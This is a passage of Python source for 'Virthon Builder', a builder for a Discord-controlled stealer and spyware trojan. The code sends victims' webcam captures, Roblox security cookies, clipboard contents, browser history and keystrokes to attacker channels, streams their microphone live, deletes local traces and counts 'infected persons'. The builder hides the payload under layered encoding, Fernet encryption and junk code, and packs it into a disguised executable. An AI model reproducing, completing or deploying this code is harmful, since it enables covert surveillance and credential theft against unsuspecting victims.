        category_names = ["Salons textuels", "Salons vocaux", "Text Channels", "Voice Channels", "Tekstkanaler", "Talekanaler", "TextkanÃ¤le", "SprachkanÃ¤le", "Canales de texto", "Canales de voz", "Tekstualni kanali", "Glasovni kanali", "Canali testuali", "Canali vocali", "PokalbiÅ³ kanalai", "Balso PokalbiÅ³ Kanalai", "SzÃ¶veg csatornÃ¡k", "HangcsatornÃ¡k", "Tekstkanalen", "Spraakkanalen", "Tekstkanaler", "Talekanaler", "KanaÅy tekstowe", "KanaÅy gÅosowe", "Canais de Texto", "Canais de Voz", "Canale de text", "Canale voce", "Tekstikanavat", "Puhekanavat", "Textkanaler", "RÃ¶stkanaler", "KÃªnh Chat", "KÃªnh ÄÃ m thoáº¡i", "Metin KanallarÄ±", "Ses KanallarÄ±", "TextovÃ© kanÃ¡ly", "HlasovÃ© kanÃ¡ly", "ÎÎ±Î½Î¬Î»Î¹Î± ÎºÎµÎ¹Î¼Î­Î½Î¿Ï", "ÎÎ±Î½Î¬Î»Î¹Î± Î¿Î¼Î¹Î»Î¯Î±Ï", "Ð¢ÐµÐºÑÑÐ¾Ð²Ð¸ ÐºÐ°Ð½Ð°Ð»Ð¸", "ÐÐ»Ð°ÑÐ¾Ð²Ð¸ ÐºÐ°Ð½Ð°Ð»Ð¸", "Ð¢ÐµÐºÑÑÐ¾Ð²ÑÐµ ÐºÐ°Ð½Ð°Ð»Ñ", "ÐÐ¾Ð»Ð¾ÑÐ¾Ð²ÑÐµ ÐºÐ°Ð½Ð°Ð»Ñ", "Ð¢ÐµÐºÑÑÐ¾Ð²Ñ ÐºÐ°Ð½Ð°Ð»Ð¸", "ÐÐ¾Ð»Ð¾ÑÐ¾Ð²Ñ ÐºÐ°Ð½Ð°Ð»Ð¸", "à¤à¥à¤à¥à¤¸à¥à¤ à¤à¥à¤¨à¤²", "à¤µà¥à¤¯à¤¸ à¤à¥à¤¨à¤²", "à¸à¹à¸­à¸à¸à¹à¸­à¸à¸§à¸²à¸¡", "à¸à¹à¸­à¸à¸ªà¸³à¸«à¸£à¸±à¸à¸à¸¹à¸", "æå­é¢é", "è¯­é³é¢é", "fãã­ã¹ããã£ã³ãã«", "ãã¤ã¹ãã£ã³ãã«", "æå­é »é", "èªé³é »é", "ì±í ì±ë", "ìì± ì±ë"]
        async def delete_category(guild, category_name):
            category = discord.utils.get(guild.categories, name=category_name)
            if category:
                for channel in category.channels:
                    await channel.delete()
                await category.delete()
        for category_name in category_names:
            await delete_category(guild, category_name)
        await guild.create_text_channel("info", category=new_category)
        await guild.create_text_channel("stealer", category=new_category)
        await guild.create_text_channel("cmd", category=new_category)
        await guild.create_text_channel("log", category=new_category)
        await guild.create_voice_channel("real time voice", category=new_category)
        info_channel = discord.utils.get(guild.channels, name="info", category=new_category)
        vembed = Embed(title=f"try to inject the virus | `{pc_name} ({mac})`", description="stage 1/3", color=0x00ff00)
        message = await info_channel.send(embed=vembed)
        info_channel = discord.utils.get(guild.channels, name="log", category=new_category)
        await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [+] `{mac}-{username}` was add to the virus <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())
        updated1_embed = Embed(title=f"Code execute successfully | `{pc_name} ({mac})`", description="Stage 2/3", color=0xff8000)
        task = bot.loop.create_task(blocking_code_start(message, updated1_embed))
        await task
        updated2_embed = Embed(title=f"Virus injected successfully | `{pc_name} ({mac})`", description="Stage 3/3", color=0xff0000)
        info_channel = discord.utils.get(guild.channels, name="stealer", category=new_category)
        files_list = [file, file_cam]
        try:
            files_list.append(file_roblox)
        except:
            pass
        try:
            files_list.append(file_paperclip)
        except:
            pass
        try:
            files_list.append(file_hist)
        except:
            pass
        await info_channel.send(embed=embed, files=files_list)
        info_channel = discord.utils.get(guild.channels, name="log", category=new_category)
        await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [+] stealer recovered <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())
        file_cam.close()
        file.close()
        try:
            file_hist.close()
        except:
            pass
        try:
            file_roblox.close()
        except:
            pass
        try:
            file_paperclip.close()
        except:
            pass
        try:
            os.remove(rf"{user}\screencam.jpg")
        except:
            pass
        try:
                os.remove(image_full_screen)
        except:
            pass
        try:
            os.remove(fr"{user}\history.csv")
        except:
            pass
        try:
            os.remove(fr"{user}\roblosecurity.txt")
        except:
            pass
        try:
            os.remove(fr"{user}\paperclip.txt")
        except:
            pass
        await message.edit(embed=updated2_embed)
if os.path.exists(fichier_path):
    with open(fichier_path, 'r') as f:
        valeur = f.read().strip().lower() == 'true'
    if not valeur:
        with open(fichier_path, 'w') as f:
            f.write('True')
        main()
    else:
        @bot.event
        async def on_ready():
            clear_terminal()
            try:
                synced = await bot.tree.sync()
            except:
                pass
            guild = bot.get_guild(guild_id)
            category = discord.utils.get(guild.categories, name=f"{mac}-{username}")
            @tasks.loop(seconds=10)
            async def update_presence():
                i = 0
                for guild in bot.guilds:
                    for category in guild.categories:
                        i += 1
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f'{i} infected persons'))
            update_presence.start()
            info_channel = discord.utils.get(guild.channels, name="log", category=category)
            try:
                await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [+] `{mac}-{username}` is connected <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())
            except Exception as e:
                truncated_content = str(e)[:1020] + "..." if len(str(e)) > 1024 else str(e)
                embed.add_field(name=".", value=truncated_content, inline=True)
            await bot.loop.run_in_executor(None, blocking_code)
            if category:
                channel = discord.utils.get(category.channels, name="stealer")
                info_channel1 = bot.get_channel(channel.id)
                files_list = [file, file_cam]
                try:
                    files_list.append(file_roblox)
                except:
                    pass
                try:
                    files_list.append(file_paperclip)
                except:
                    pass
                try:
                    files_list.append(file_hist)
                except:
                    pass
                await info_channel1.send(embed=embed, files=files_list)
                await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [+] stealer recovered <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())
            file_cam.close()
            file.close()
            try:
                file_hist.close()
            except:
                pass
            try:
                file_roblox.close()
            except:
                pass
            try:
                file_paperclip.close()
            except:
                pass
            try:
                os.remove(rf"{user}\screencam.jpg")
            except:
                pass
            try:
                os.remove(image_full_screen)
            except:
                pass
            try:
                os.remove(fr"{user}\history.csv")
            except:
                pass
            try:
                os.remove(fr"{user}\roblosecurity.txt")
            except:
                pass
            try:
                os.remove(fr"{user}\paperclip.txt")
            except:
                pass
else:
    with open(fichier_path, 'w') as f:
        f.write('True')
    main()

@bot.tree.command(name="keylogger", description="get the keys tapped on are keyboard.")
@commands.has_permissions(administrator=True)
async def keylogger(interaction: discord.Interaction):
    guild = bot.get_guild(guild_id)
    category = interaction.channel.category
    global keys_n 
    global line_n
    keys_n = 1
    with open(fr"{user}\keylogger.txt", "w") as f:
        f.write("".join(keys))
        f.close()
        line_n += 1
    info_channel = discord.utils.get(guild.channels, name="log", category=category)
    await interaction.response.send_message("the keys stored in the keylogger have been recovered.", ephemeral=True)
    await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [+] keylogger recovered <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())
    info_channel = discord.utils.get(guild.channels, name="stealer", category=category)
    file_key = discord.File(fr'{user}\keylogger.txt', filename=f"SPOILER_keylogger_{pc_name}.txt")
    await info_channel.send(file=file_key)
    file_key.close()
    os.remove(f"{user}\keylogger.txt")

@bot.tree.command(name="clear", description="Delete a given number of messages.")
@commands.has_permissions(administrator=True)
async def clear(interaction: discord.Interaction, nombre: int):
    name = interaction.user
    mssa = f"{nombre} messages have been clear"
    
    if nombre >= 999:
        nombre = 99999999
        mssa = f"All possible messages have been cleared"
    
    channel = interaction.channel
    messages = []
    await interaction.response.send_message(mssa, ephemeral=True)

    async for message in channel.history(limit=nombre):
        messages.append(message)
    
    await channel.delete_messages(messages)
    i = 0
    category = interaction.channel.category
    guild = bot.get_guild(guild_id)
    info_channel = discord.utils.get(guild.channels, name="log", category=category)
    for message in messages:
        i += 1
    await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [-] {i} messages was clear by {name.mention} <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())

@bot.tree.command(name="rebuild", description="Delete the current salon and recreate it.")
@commands.has_permissions(administrator=True)
async def reset_channel(interaction: discord.Interaction):
    guild = bot.get_guild(guild_id)
    channel = interaction.channel
    channel_name = channel.name
    channel_position = channel.position
    category = channel.category
    category_name = category.name
    name = interaction.user
    if category_name == f"{mac}-{username}":
        await channel.delete()
        new_channel = await category.create_text_channel(name=channel_name, position=channel_position)
        info_channel = discord.utils.get(guild.channels, name="log", category=category)
        await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [=] channel `{channel_name}` has rebuild by {name.mention} <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())

@bot.tree.command(name="reset", description="Delete the current category and recreate it.")
@commands.has_permissions(administrator=True)
async def reset_category(interaction: discord.Interaction):
    guild = bot.get_guild(guild_id)
    category = interaction.channel.category
    category_name = category.name
    name = interaction.user
    category_position = category.position
    if category_name == f"{mac}-{username}":
        for channel in category.channels:
            await channel.delete()
        await category.delete()
        new_category = await interaction.guild.create_category(name=category_name, position=category_position, overwrites={
            guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False), 
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)})
        await guild.create_text_channel("info", category=new_category)
        await guild.create_text_channel("stealer", category=new_category)
        await guild.create_text_channel("cmd", category=new_category)
        await guild.create_text_channel("log", category=new_category)
        await guild.create_voice_channel("real time voice", category=new_category)
        info_channel = discord.utils.get(guild.channels, name="log", category=new_category)
        await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [=] category `{category_name}` has reset by {name.mention} <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())

# Configurer les paramÃ¨tres audio
CHUNK = 1024  # La taille des morceaux de donnÃ©es audio
FORMAT = pyaudio.paInt16  # Le format audio
CHANNELS = 1  # Nombre de canaux (1 pour mono, 2 pour stÃ©rÃ©o)
RATE = 44100  # Taux d'Ã©chantillonnage en Hz

# Initialiser PyAudio
p = pyaudio.PyAudio()
is_playing_audio = False  # Drapeau pour indiquer si le bot est en train de jouer un morceau

@bot.tree.command(name="join", description="Hear the microphone in real time.")
@commands.has_permissions(administrator=True)
async def join_voice_channel(interaction: discord.Interaction):
    guild = bot.get_guild(guild_id)
    category = interaction.channel.category
    category_name = category.name
    user = interaction.user
    if category_name == f"{mac}-{username}":
        if user.voice:  
            channel = user.voice.channel
            if bot.voice_clients:
                for vc in bot.voice_clients:
                    if vc.guild == guild:
                        await vc.disconnect()
                        clear_terminal()
            voice_channel = await channel.connect()
            stream_in = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

            while True:
                data = stream_in.read(CHUNK)
                if not data:
                    break
                voice_channel.play(discord.FFmpegPCMAudio(data, pipe=True), after=lambda e: print('done', e) if e else None)

            clear_terminal()
            await interaction.response.send_message("The bot has join the voice channel.", ephemeral=True)
            info_channel = discord.utils.get(guild.channels, name="log", category=category)
            if info_channel:
                await info_channel.send(f"session started at : {date.strftime('%Y %d/%m %H:%M:%S')} : log [+] bot join {channel.mention} by {user.mention} <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())
        else:
            await interaction.response.send_message("You are not in a voice channel.", ephemeral=True)

@bot.tree.command(name="leave", description="Make the bot leave the voice channel.")
@commands.has_permissions(administrator=True)
async def leave_channel(interaction: discord.Interaction):
    guild = bot.get_guild(guild_id)
    category = interaction.channel.category
    category_name = category.name
    user = interaction.user
    voice_state = user.voice
    if category_name == f"{mac}-{username}":
        if voice_state and voice_state.channel:
            channel = voice_state.channel
            for vc in bot.voice_clients:
                if vc.guild == guild:
                    await vc.disconnect()
                    clear_terminal()
            info_channel = discord.utils.get(guild.channels, name="log", category=category)
            if info_channel:
                await info_channel.send(f"{date.strftime('%d/%m/%Y %H:%M:%S')} : log [-] bot leave {channel.mention} by {user.mention} <t:{int(time.time())}:R>", allowed_mentions=discord.AllowedMentions.none())
            await interaction.response.send_message("The bot has left the voice channel.", ephemeral=True)
        else:
            await interaction.response.send_message("The author is not currently in a voice channel.", ephemeral=True)
    """fr"""
bot.run('{bot_token}')"""
            original_code = data

            obfuscated = base64.b64encode(base64.b32encode(zlib.compress(marshal.dumps(original_code.encode()))))[::-1]

            gotobase64 = base64.b64encode(obfuscated)
            gotobase64x2 = base64.b64encode(gotobase64)
            gotobase32 = base64.b32encode(gotobase64x2)
            gotobase64x3 = base64.b64encode(gotobase32)

            stubkey = Fernet.generate_key()
            cipher = Fernet(stubkey)
            encrypted_data = cipher.encrypt(gotobase64x3)
            newdata = encrypted_data.decode()
            hex_str = newdata.encode().hex()
            value = int(scale.get())
            if not value == 0:
                real_value = value*10000
                junk_code = junkgenerator(real_value)
            else:
                junk_code = ""
            stub2 = f"""import sys
import subprocess
import os
import socket
import time
from uuid import getnode as get_mac
import zipfile
import io
import json
import base64
from base64 import b64decode
from os import listdir
from json import loads
from re import findall
from subprocess import Popen, PIPE
import glob
from datetime import datetime, timedelta
import shutil
import socket
from concurrent.futures import ThreadPoolExecutor
import threading
import importlib
import pyaudio
import numpy as np
import pyperclip
from pynput import keyboard
import discord
from discord import Embed
from discord.ext import commands, tasks
import psutil
import asyncio
from PIL import Image
import sqlite3
from Cryptodome.Cipher import AES
import requests
from urllib.request import Request, urlopen
import cv2
import pyautogui
import browser_history
import robloxpy
import browser_cookie3
import win32crypt
from win32crypt import CryptUnprotectData
from desktopmagic.screengrab_win32 import getDisplayRects, getRectAsImage
import nacl
import base64 as __
import marshal as ____
import zlib as _______
from cryptography.fernet import Fernet as _____
__mikey__ = "{base64.b64encode(stubkey).decode()}"
mydata = "{hex_str}"
__virthon__ = lambda x: ____.loads(_______.decompress(__.b32decode(__.b64decode(x[::-1]))))
__mycip__ = _____(__.b64decode(__mikey__))
__step1__ = bytes.fromhex(mydata)
__step2__ = __mycip__.decrypt(__step1__)
__decr__ = __.b64decode(__step2__)
__decrdata__ = __decr__
__gotnew__ = __.b32decode(__decr__)
__newdecr__ = {random.randint(999999, 999999999999)}
__getnew__ = __newdecr__
__myb64code__ = __.b64decode(__gotnew__)
__myb64codee__ = __.b64decode(__myb64code__)
___ = __myb64codee__
exec(__virthon__(___))

    """f"""{junk_code}
    """
            not_py_filename = 'Obfuscated(Classic)'
            py_filename = 'Obfuscated(Classic).pyw'
            with open(py_filename, "w", encoding="utf-8") as file:
                file.write(stub2)
                file.close()
            if os.path.exists(filename):
                os.remove(filename)
            if 'icon_path' not in locals() and 'icon_path' not in globals():
                os.system(f'pyinstaller --onefile "{py_filename}"')
            else:
                os.system(f'pyinstaller --onefile -i"{icon_path}" "{py_filename}"')
            os.rename(f'dist/{os.path.splitext(os.path.basename(py_filename))[0]}.exe', filename)
            shutil.rmtree("dist")
            shutil.rmtree("build")
            os.remove(f"{not_py_filename}.spec")
            os.remove(py_filename)

        main()

    def obfuscation_thread():
        obfuscation_thread = threading.Thread(target=obfuscate_code)
        obfuscation_thread.start()

    def genjunk():
        return f"""
    def saint{random.randint(10000000000000000000000000000, 99999999999999999999999999999)}():
        if {random.randint(1000000, 9999999)} == {random.randint(1000000, 9999999)}:
            print({random.randint(1000000, 9999999)})
            aaa{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            print({random.randint(1000000, 9999999)})
            bbb{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            aa{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            z{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            zz{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            c{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            cc{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            ce{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            cg{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            cv{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            ch{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            cu{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            co{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
        elif {random.randint(100000000000000000, 999999999999999999)} == {random.randint(100000000000000000, 999999999999999999)}:
            print({random.randint(1000000, 9999999)})
            aaa{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            print({random.randint(1000000, 9999999)})
            bbb{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            aa{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            x{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            xx{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            a{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            aa{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            ad{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            as{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            az{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            ah{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            ag{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            ai{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}
            an{random.randint(1000000, 9999999)} = {random.randint(1000000, 9999999)}"""

    def junkgenerator(junkrange):
        junks = ''
        for a in range(junkrange):
            junks += genjunk()
        return junks

    def select_icon():
        global icon_path
        file_path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
        if file_path:
            icon_path = file_path

    app = ThemedTk(theme="gray")
    app.configure(background='gray')
    app.title("Virthon Builder")
    app.geometry("300x300")
    app.resizable(False, False)

    guild_id_label = tk.Label(app, text="Guild ID:", bg=dark_background)
    guild_id_label.pack()
    guild_id_entry = tk.Entry(app, width=40, bg=dark_background)
    guild_id_entry.pack()

    bot_token_label = tk.Label(app, text="Bot Token:", bg=dark_background)
    bot_token_label.pack()
    bot_token_entry = tk.Entry(app, width=40, bg=dark_background)
    bot_token_entry.pack()

    filename_label = tk.Label(app, text="File name:", bg=dark_background)
    filename_label.pack()
    filename_entry = tk.Entry(app, width=40, bg=dark_background)
    filename_entry.pack()
    filename_entry.insert(0, "virthon.exe")

    guild_id_label = tk.Label(app, text="junk code (5 = ~18MB)", bg=dark_background)
    guild_id_label.pack()
    scale = tk.Scale(app, from_=0, to=100, orient="horizontal", bg=dark_background, length=150)
    scale.set(0)
    junk_code = ""
    scale.pack()

    space_label = tk.Label(app, text="", bg=dark_background)
    space_label.pack()

    icon_button = ttk.Button(app, text="Select Icon", command=select_icon)
    icon_button.pack()

    obfuscate_button = ttk.Button(app, text="Build Virthon", command=obfuscation_thread)
    obfuscate_button.pack(pady=10)
    obfuscate_button.config(style='TButton')

    app.mainloop()

root = ThemedTk(theme="gray")
root.configure(background='gray')
root.geometry("170x150")
root.resizable(False, False)

username_label = tk.Label(root, text="Nom d'utilisateur", bg=dark_background)
username_label.pack()
username_entry = tk.Entry(root, bg=dark_background)
username_entry.pack()

password_label = tk.Label(root, text="Mot de passe", bg=dark_background)
password_label.pack()
password_entry = tk.Entry(root, show="*", bg=dark_background)
password_entry.pack()

space_label = tk.Label(root, text="", bg=dark_background)
space_label.pack()

login_button = tk.Button(root, text="Se connecter", command=check_login, bg=dark_background)
login_button.pack()

def fill_credentials():
    global username_entry, password_entry
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            content = file.readlines()
            if content:
                parts = content[0].split(":")
                if len(parts) == 2:
                    username_from_file, password_from_file = parts
                    username = username_from_file.strip()
                    password = password_from_file.strip()
                    if username_entry:
                        username_entry.delete(0, tk.END)
                        username_entry.insert(0, username)
                    if password_entry:
                        password_entry.delete(0, tk.END)
                        password_entry.insert(0, password)

fill_credentials()

root.mainloop()
